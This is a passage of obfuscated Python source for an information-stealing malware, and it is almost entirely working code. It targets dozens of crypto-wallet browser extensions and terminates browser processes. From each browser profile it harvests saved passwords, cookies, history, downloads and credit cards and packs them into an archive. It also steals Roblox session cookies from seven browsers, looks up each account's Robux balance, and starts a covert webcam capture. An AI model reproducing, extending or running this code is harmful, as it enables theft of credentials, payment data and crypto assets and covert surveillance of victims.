        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
        ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
        ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
        ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
        ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
        ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
        ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
        ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
        ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
        ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
        ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
        ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
        ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
        ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
        ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
        ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
        ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
    ]
    
    try:
        for VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO, BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ, v4r_proc_name in YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ_files:
            for v4r_proc in psutil.process_iter(['pid', 'name']):
                try:
                    if v4r_proc.name().lower() == v4r_proc_name.lower():
                        v4r_proc.terminate()
                except:
                    pass
    except:
        pass

    for VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO, BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ, v4r_proc_name in YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ_files:
        if not os.path.exists(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ):
            continue

        HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV = MTAZZWJNTARMXPZECPXKXKTDCOLQJXYMOPDLYRYWQYPZXQKYDAWFDSHUSYYNPUOTDVLXDQYZAUGVKTOGTRQ(os.path.join(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ, 'Local State'))
        if not HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV:
            continue

        for v4r_profile in PPJDIAIFUMNKFAPSUKCVVZBNOFVXZQXCPCZONUAOATARWTOLSYECZMZPAYKYDGHVCSJCNNSORQSAHVMODPHB:
            GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA = os.path.join(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ, v4r_profile)
            if not os.path.exists(GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA):
                continue

        for v4r_profile in PPJDIAIFUMNKFAPSUKCVVZBNOFVXZQXCPCZONUAOATARWTOLSYECZMZPAYKYDGHVCSJCNNSORQSAHVMODPHB:
            GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA = os.path.join(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ, v4r_profile)
            if not os.path.exists(GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA):
                continue
            
            if "extentions" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
                try: HUTUHEYNIARRHHIKAXAFQLNMLMRFWPCWXMSZKWHXTQONBFKKUZOOYAT(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW, IRGHKOHKYGJFNAOZIRQSXOWISZHXKDFMEYEZNNIYPXTNOQYVBMXCKVFWFFKKFDCLVQLGUWUHIFXMWXBESFORRIBDIPGXRL, VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO, GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA)
                except: pass
                
            if "passwords" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
                try: EIZLCFJKTYNPMNXQPLGTABQVXYGNQBEUKNOSNDQZWZFWRLSJKIWEJWDMLPQRKVQLDUNWRVYPYIVGLTYRYEI(VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO, GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA, HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV)
                except: pass
            if "cookies" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
                try: ZXOWHCXNJCJNFZEDDEGFVODTEKRKEBQKFXKFBBZQFQGWFYLZLNFP(VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO, GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA, HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV)
                except: pass
            if "history" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
                try: SBZOLDYAQAJYPVAFLLTYAUAEOWUSXQAAEKPZCIMSEQKEHHTUAYXCGLDDUEBSFXJSNJEINIEYJYPAMZEW(VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO, GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA)
                except: pass
            if "downloads" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
                try: BPXSLIDAPQVUBKQKTSLBAHFUBCWGOZATPDNJYOGQVNLMNKLLMCJDSTDIGSQXKAMSSIBBCNMKTBLFZAPLROWSEJWBPLOKVAH(VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO, GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA)
                except: pass
            if "cards" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
                try: ZJSKQHOIYLXGZCJCUEJNCPIWWWVELLMEFGHYWCIEHGDRAUKWXYSIRRHWMGXEZIQYPKT(VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO, GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA, HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV)
                except: pass

            if VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO not in XHMAJNFEHLLTTLMHBYKIYDYLBEJMIUPKOBGGZHAANTNFIGFNLDPNEWMYSKCXXAFAFPUFPIIIDVJNSCPKEXMXYVSCXSMHOHCREI:
                XHMAJNFEHLLTTLMHBYKIYDYLBEJMIUPKOBGGZHAANTNFIGFNLDPNEWMYSKCXXAFAFPUFPIIIDVJNSCPKEXMXYVSCXSMHOHCREI.append(VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO)

    if "passwords" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
        if not ESJQGEIRNDJZPEHTOZHZBXQDJTTYTVANDSNDGZHLGNYDQSYBTRJ:
            ESJQGEIRNDJZPEHTOZHZBXQDJTTYTVANDSNDGZHLGNYDQSYBTRJ.append("No passwords was saved on the victim's computer.")
        ESJQGEIRNDJZPEHTOZHZBXQDJTTYTVANDSNDGZHLGNYDQSYBTRJ = "\n".join(ESJQGEIRNDJZPEHTOZHZBXQDJTTYTVANDSNDGZHLGNYDQSYBTRJ)
    if "cookies" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
        if not SJDSHEGMXJEKZFUMPCILQIHUXXLOTTGBCMTXAVFRAIGDDPKEFQZITRRKBDMX:
            SJDSHEGMXJEKZFUMPCILQIHUXXLOTTGBCMTXAVFRAIGDDPKEFQZITRRKBDMX.append("No cookies was saved on the victim's computer.")
        SJDSHEGMXJEKZFUMPCILQIHUXXLOTTGBCMTXAVFRAIGDDPKEFQZITRRKBDMX   = "\n".join(SJDSHEGMXJEKZFUMPCILQIHUXXLOTTGBCMTXAVFRAIGDDPKEFQZITRRKBDMX)
    if "history" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
        if not LAOUUPDGHKFIQTNFJGCQQFRSLCEBBNBECXVGIFQELPZNQSWAZYPLLPKNVND:
            LAOUUPDGHKFIQTNFJGCQQFRSLCEBBNBECXVGIFQELPZNQSWAZYPLLPKNVND.append("No history was saved on the victim's computer.")
        LAOUUPDGHKFIQTNFJGCQQFRSLCEBBNBECXVGIFQELPZNQSWAZYPLLPKNVND   = "\n".join(LAOUUPDGHKFIQTNFJGCQQFRSLCEBBNBECXVGIFQELPZNQSWAZYPLLPKNVND)
    if "downloads" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
        if not EUKOHSSNAEVMFEJPUFTRHQAMQNXAZDZFIGNZGIUOECWPYQQDSLG:
            EUKOHSSNAEVMFEJPUFTRHQAMQNXAZDZFIGNZGIUOECWPYQQDSLG.append("No downloads was saved on the victim's computer.")
        EUKOHSSNAEVMFEJPUFTRHQAMQNXAZDZFIGNZGIUOECWPYQQDSLG = "\n".join(EUKOHSSNAEVMFEJPUFTRHQAMQNXAZDZFIGNZGIUOECWPYQQDSLG)
    if "cards" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
        if not WEMCBNBUNERKUMWGGHRPWNOQYUBNJQAOTVUUBWJCLVKZFJAQVFRNIJYWXDEMJOGXNNPNLNPBGTGOJBLJQMPJELYKVEFJ:
            WEMCBNBUNERKUMWGGHRPWNOQYUBNJQAOTVUUBWJCLVKZFJAQVFRNIJYWXDEMJOGXNNPNLNPBGTGOJBLJQMPJELYKVEFJ.append("No cards was saved on the victim's computer.")
        WEMCBNBUNERKUMWGGHRPWNOQYUBNJQAOTVUUBWJCLVKZFJAQVFRNIJYWXDEMJOGXNNPNLNPBGTGOJBLJQMPJELYKVEFJ     = "\n".join(WEMCBNBUNERKUMWGGHRPWNOQYUBNJQAOTVUUBWJCLVKZFJAQVFRNIJYWXDEMJOGXNNPNLNPBGTGOJBLJQMPJELYKVEFJ)
    
    if IHRHQZQLZZZDFNPURSUBMFLZHDQLMZOLVSQHZBLYVFEZNYCHDCTLWZZABVHBMOKAPORHXFUPYBONAXEMTMIEDQRNMEXZWXQ != None:
        KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW.writestr(f"Passwords ({IHRHQZQLZZZDFNPURSUBMFLZHDQLMZOLVSQHZBLYVFEZNYCHDCTLWZZABVHBMOKAPORHXFUPYBONAXEMTMIEDQRNMEXZWXQ}).txt", ESJQGEIRNDJZPEHTOZHZBXQDJTTYTVANDSNDGZHLGNYDQSYBTRJ)

    if OUQYWXQYDRBWWELOVBCVPPENSOZQKJGPLNKUMGFSRAVCULHPLWO != None:
        KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW.writestr(f"Cookies ({OUQYWXQYDRBWWELOVBCVPPENSOZQKJGPLNKUMGFSRAVCULHPLWO}).txt", SJDSHEGMXJEKZFUMPCILQIHUXXLOTTGBCMTXAVFRAIGDDPKEFQZITRRKBDMX)

    if ZDMOHDEYPMRCPXIHNQPRWTETHBZHUXFMUZLKXFHSUIOGMFWAMSFGECMGOKMJU != None:
        KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW.writestr(f"Cards ({ZDMOHDEYPMRCPXIHNQPRWTETHBZHUXFMUZLKXFHSUIOGMFWAMSFGECMGOKMJU}).txt", WEMCBNBUNERKUMWGGHRPWNOQYUBNJQAOTVUUBWJCLVKZFJAQVFRNIJYWXDEMJOGXNNPNLNPBGTGOJBLJQMPJELYKVEFJ)

    if LEGMWKDGKYFELYOPFTUFJXNRHGUBVDYGRLLYQMZRAJYADMROUXUTMSSYRZHZBSNEVUILNXEHNLHXLFYYETNCECKVXJCHPXTMXJK != None:
        KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW.writestr(f"Browsing History ({LEGMWKDGKYFELYOPFTUFJXNRHGUBVDYGRLLYQMZRAJYADMROUXUTMSSYRZHZBSNEVUILNXEHNLHXLFYYETNCECKVXJCHPXTMXJK}).txt", LAOUUPDGHKFIQTNFJGCQQFRSLCEBBNBECXVGIFQELPZNQSWAZYPLLPKNVND)

    if THJSRYXEPKKJMSXJXRZDOGGDYIVHJVUMFSFLREQWLQEFSXHVSF != None:
        KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW.writestr(f"Download History ({THJSRYXEPKKJMSXJXRZDOGGDYIVHJVUMFSFLREQWLQEFSXHVSF}).txt",EUKOHSSNAEVMFEJPUFTRHQAMQNXAZDZFIGNZGIUOECWPYQQDSLG)

    return WJVLHCGOFLUZAXIPYBORMGLZDJDOMTNQIDVETIHIKARLYPTYRQ, IHRHQZQLZZZDFNPURSUBMFLZHDQLMZOLVSQHZBLYVFEZNYCHDCTLWZZABVHBMOKAPORHXFUPYBONAXEMTMIEDQRNMEXZWXQ, OUQYWXQYDRBWWELOVBCVPPENSOZQKJGPLNKUMGFSRAVCULHPLWO, LEGMWKDGKYFELYOPFTUFJXNRHGUBVDYGRLLYQMZRAJYADMROUXUTMSSYRZHZBSNEVUILNXEHNLHXLFYYETNCECKVXJCHPXTMXJK, THJSRYXEPKKJMSXJXRZDOGGDYIVHJVUMFSFLREQWLQEFSXHVSF, ZDMOHDEYPMRCPXIHNQPRWTETHBZHUXFMUZLKXFHSUIOGMFWAMSFGECMGOKMJU

def KCWMZUFPOPCWMFWMVQJLPDUBNBLENXZGUPCGBKYNYILRKAWPRLMPLCYMDAUHATHHHPSTSQCDBIHATPIEHNQHDD(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW):
    import browser_cookie3
    import requests
    import json

    HOIREDPRBSILVWOFBIJAEYQQBAUHRBSYOVHLPUQGAKGNRVTEXU = ""
    NKWKZUOMLSVOMRNTCESJOTWRXFHYOATCXELRGLKTPOMYYBLEJWHBWRXVXITXELGUANPEMFKZUNKZRN = 0
    DDLQFCONYOVYNSMWQTZGFXATHVOMIBQMAMRPAHAEAISDHLFYQNWWQTCVDTHQOHWIYFFJJNQCZSHTQILPNEZNNQYENWZENEHD = []
    

    def IPYGXERBUGQOGDBOYHTFSDASDPXHDCQMBKMBHNWIAOHVWPDFJUVGTSCJUWIGXSO(CWMPGAHCEJIUYAHUMPJTTCSILUDOCFMVCFWUKNNMQOQNFXGEYHWLLWUSNZJLFAAFNTORIDWMLZEYOJHSKJIYWUINTI):
        try:
            MNWZLMUUETWCEIZRIWHDBQHPEIMYSRAMZZCIXVAVADTZVYRRYOJOMXJMXSNSHLIRSTOEQQTJPYDBEYUSJLFZSZFSJUWQQHGAQMF = CWMPGAHCEJIUYAHUMPJTTCSILUDOCFMVCFWUKNNMQOQNFXGEYHWLLWUSNZJLFAAFNTORIDWMLZEYOJHSKJIYWUINTI()
            MNWZLMUUETWCEIZRIWHDBQHPEIMYSRAMZZCIXVAVADTZVYRRYOJOMXJMXSNSHLIRSTOEQQTJPYDBEYUSJLFZSZFSJUWQQHGAQMF = str(MNWZLMUUETWCEIZRIWHDBQHPEIMYSRAMZZCIXVAVADTZVYRRYOJOMXJMXSNSHLIRSTOEQQTJPYDBEYUSJLFZSZFSJUWQQHGAQMF)
            PMEPXORFYILBUZALGDTZNHQCJZZWHVVDPDHRYYPVQMLIVULYFEUWSNYCFVEVJVCWMXXM = MNWZLMUUETWCEIZRIWHDBQHPEIMYSRAMZZCIXVAVADTZVYRRYOJOMXJMXSNSHLIRSTOEQQTJPYDBEYUSJLFZSZFSJUWQQHGAQMF.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            MTGXHWTAIPXNPJDURMWRAAZPVABMMBNYRKBOOBASTTMHHERMCUPXDMGIHVKLIXSKGEKSGMK = CWMPGAHCEJIUYAHUMPJTTCSILUDOCFMVCFWUKNNMQOQNFXGEYHWLLWUSNZJLFAAFNTORIDWMLZEYOJHSKJIYWUINTI.__name__
            return PMEPXORFYILBUZALGDTZNHQCJZZWHVVDPDHRYYPVQMLIVULYFEUWSNYCFVEVJVCWMXXM, MTGXHWTAIPXNPJDURMWRAAZPVABMMBNYRKBOOBASTTMHHERMCUPXDMGIHVKLIXSKGEKSGMK
        except:
            return None, None

    def MicrosoftEdge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def GoogleChrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def OperaGX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    ZLHFFQPAYYQCDZABIIQPYEWIIACZKAQTHWQWXVREFTCDZTWMZEROSMWRRGESAXYZQDYOWUSATMFCV = [MicrosoftEdge, GoogleChrome, Firefox, Opera, OperaGX, Safari, Brave]
    for v4r_br0ws3r in ZLHFFQPAYYQCDZABIIQPYEWIIACZKAQTHWQWXVREFTCDZTWMZEROSMWRRGESAXYZQDYOWUSATMFCV:
        v4r_c00ki3, MTGXHWTAIPXNPJDURMWRAAZPVABMMBNYRKBOOBASTTMHHERMCUPXDMGIHVKLIXSKGEKSGMK = IPYGXERBUGQOGDBOYHTFSDASDPXHDCQMBKMBHNWIAOHVWPDFJUVGTSCJUWIGXSO(v4r_br0ws3r)
        if v4r_c00ki3:
            if v4r_c00ki3 not in DDLQFCONYOVYNSMWQTZGFXATHVOMIBQMAMRPAHAEAISDHLFYQNWWQTCVDTHQOHWIYFFJJNQCZSHTQILPNEZNNQYENWZENEHD:
                NKWKZUOMLSVOMRNTCESJOTWRXFHYOATCXELRGLKTPOMYYBLEJWHBWRXVXITXELGUANPEMFKZUNKZRN += 1
                DDLQFCONYOVYNSMWQTZGFXATHVOMIBQMAMRPAHAEAISDHLFYQNWWQTCVDTHQOHWIYFFJJNQCZSHTQILPNEZNNQYENWZENEHD.append(v4r_c00ki3)
                try:
                    HPHFBKDNUXDMODGGNQSZDPYFRVICMXIUVFBDRXFSMGNXCUXXVZPMGNBSGRVOCOEUHFSJKVRTQJYHAOMYYU = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": v4r_c00ki3})
                    UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN = json.loads(HPHFBKDNUXDMODGGNQSZDPYFRVICMXIUVFBDRXFSMGNXCUXXVZPMGNBSGRVOCOEUHFSJKVRTQJYHAOMYYU.text)
                except:
                    UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN = {"None": "None"}

                QVWKFESAKVIEIHTWLQQCUXRADMJVEHBMJNNJSWUMRICZVQGWAVQERHZBULECIUKJDVCQPHRKCYFACDBDOZAFMGXZQLFUQXWJB = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('id', "None")
                URQQUJHUZEDGBDNLEXWCBETRDAQUJCGBMBJXQAHDTGMYTYACDXIYJSIJMXGVJSCPMBLJWVUHYXOGPWOZGBIWQUZHTDXYABCMO = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('displayName', "None")
                GUDNCARISWPXIUKTOEVIWMFNLFDSTWAGAKPFDQELWUIRECPRBHSCVLCXOHGYSAPEGIFZKL = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get('name', "None")
                EGOKCAJRFXXXGXCKDHPIASFBQRDFXBKAHYZBOFXIGRWJVEKZZYNEACSNY = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get("RobuxBalance", "None")
                EULOIJVNJBUKYVTQKGZOZFVBBSQZRCRJTMEIDALJUJDPIDHLAFDHWNAJKDTDA = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get("IsPremium", "None")
                JIYNQTBEGIQSRSUXFEIQVFGURGJSUYOYUVGTFEVHGLVZJEIEXSAKGILESYIDDRXMGMWPHWJDC = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get("ThumbnailUrl", "None")
                WTPKVOKGTCDMEZCXYRXGEDYRZZIWNUCPHSNETWSPEKDBLRPNKCNKHIHEZDKRYXPJL = UBKNKJWSAYCAKMSNFDSDZTDLITVWLZXUFAPXKWZAUMENAAZVJUDGUYZVHXN.get("IsAnyBuildersClubMember", "None")
                
                HOIREDPRBSILVWOFBIJAEYQQBAUHRBSYOVHLPUQGAKGNRVTEXU = HOIREDPRBSILVWOFBIJAEYQQBAUHRBSYOVHLPUQGAKGNRVTEXU + f"""
Roblox Account n°{str(NKWKZUOMLSVOMRNTCESJOTWRXFHYOATCXELRGLKTPOMYYBLEJWHBWRXVXITXELGUANPEMFKZUNKZRN)}:
 - Navigator     : {MTGXHWTAIPXNPJDURMWRAAZPVABMMBNYRKBOOBASTTMHHERMCUPXDMGIHVKLIXSKGEKSGMK}
 - Username      : {GUDNCARISWPXIUKTOEVIWMFNLFDSTWAGAKPFDQELWUIRECPRBHSCVLCXOHGYSAPEGIFZKL}
 - DisplayName   : {URQQUJHUZEDGBDNLEXWCBETRDAQUJCGBMBJXQAHDTGMYTYACDXIYJSIJMXGVJSCPMBLJWVUHYXOGPWOZGBIWQUZHTDXYABCMO}
 - Id            : {QVWKFESAKVIEIHTWLQQCUXRADMJVEHBMJNNJSWUMRICZVQGWAVQERHZBULECIUKJDVCQPHRKCYFACDBDOZAFMGXZQLFUQXWJB}
 - Avatar        : {JIYNQTBEGIQSRSUXFEIQVFGURGJSUYOYUVGTFEVHGLVZJEIEXSAKGILESYIDDRXMGMWPHWJDC}
 - Robux         : {EGOKCAJRFXXXGXCKDHPIASFBQRDFXBKAHYZBOFXIGRWJVEKZZYNEACSNY}
 - Premium       : {EULOIJVNJBUKYVTQKGZOZFVBBSQZRCRJTMEIDALJUJDPIDHLAFDHWNAJKDTDA}
 - Builders Club : {WTPKVOKGTCDMEZCXYRXGEDYRZZIWNUCPHSNETWSPEKDBLRPNKCNKHIHEZDKRYXPJL}
 - Cookie        : {v4r_c00ki3}
"""
                
    if not DDLQFCONYOVYNSMWQTZGFXATHVOMIBQMAMRPAHAEAISDHLFYQNWWQTCVDTHQOHWIYFFJJNQCZSHTQILPNEZNNQYENWZENEHD:
        HOIREDPRBSILVWOFBIJAEYQQBAUHRBSYOVHLPUQGAKGNRVTEXU = "No roblox cookie found."
        
    KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW.writestr(f"Roblox Accounts ({NKWKZUOMLSVOMRNTCESJOTWRXFHYOATCXELRGLKTPOMYYBLEJWHBWRXVXITXELGUANPEMFKZUNKZRN}).txt", HOIREDPRBSILVWOFBIJAEYQQBAUHRBSYOVHLPUQGAKGNRVTEXU)

    return NKWKZUOMLSVOMRNTCESJOTWRXFHYOATCXELRGLKTPOMYYBLEJWHBWRXVXITXELGUANPEMFKZUNKZRN

def UGBTNFNZJMYXUOKYEXQDASSBEOEUQRSSRJEBBLSNRYOYNMQAGEHJVGBWPUOVJWMPNC(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW):
    import cv2
    import io
    from PIL import Image

    try:
        ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_camera_capture = "Yes"
        RRICHXSSSDKTTZNWFJDUHIGNCCCCHHEIWZXXRXBPGTDZTXRYGUKWRIVUJOCPARRHNYC = cv2.VideoCapture(0)

        if not RRICHXSSSDKTTZNWFJDUHIGNCCCCHHEIWZXXRXBPGTDZTXRYGUKWRIVUJOCPARRHNYC.isOpened():
            ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_camera_capture = "No webcam found."
            return ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_camera_capture

        v4r_ret, v4r_frame = RRICHXSSSDKTTZNWFJDUHIGNCCCCHHEIWZXXRXBPGTDZTXRYGUKWRIVUJOCPARRHNYC.read()
        RRICHXSSSDKTTZNWFJDUHIGNCCCCHHEIWZXXRXBPGTDZTXRYGUKWRIVUJOCPARRHNYC.release()

        if not v4r_ret:
            ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_camera_capture = "Failed to capture image."
            DKAKTYZMMPMJFIEUTOTZOZMIPDHOKTQTMXIWSDBFGVZUZJFLCAVBPQPVMNCSLZNIFVTAXFGTNBJZDUMPACIACGOA()
            return ECDOVQJSYBYPIHYNQHPUZQIKKHDDOVADVTNZSXGWFUBTGARGZYKUUMWJAQIHTGNDRKK_camera_capture

        UMTZKLKLPDORAHZDVDTUYJURJWVBODRJYRXBRKZKDDXAVTHUJEBXGPOGYJNSLJGDRUNQ = cv2.cvtColor(v4r_frame, cv2.COLOR_BGR2RGB)
